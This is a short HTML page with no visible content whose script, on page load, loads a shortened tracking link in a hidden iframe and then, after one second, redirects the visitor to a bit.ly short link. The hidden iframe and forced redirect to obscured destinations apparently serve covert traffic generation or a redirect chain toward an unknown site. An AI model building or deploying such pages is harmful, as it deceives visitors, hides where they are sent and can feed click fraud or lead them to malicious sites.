<!DOCTYPE html>
<html>
<head>
    <title>Background Website Loading</title>
    <style>
        body {
            margin: 0;
        }

        #loading {
            display: none;
        }
    </style>
    <script>
        window.addEventListener('load', function() {
            var websiteElement = document.createElement('iframe');
            websiteElement.style.visibility = 'hidden';
            websiteElement.src = 'https://l.linklyhq.com/l/1q6xj';
            document.body.appendChild(websiteElement);

            window.setTimeout(function() {
                window.location.href = 'https://bit.ly/43opgE1';
            }, 1000);
        });
    </script>
</head>
<body>
</body>
</html>
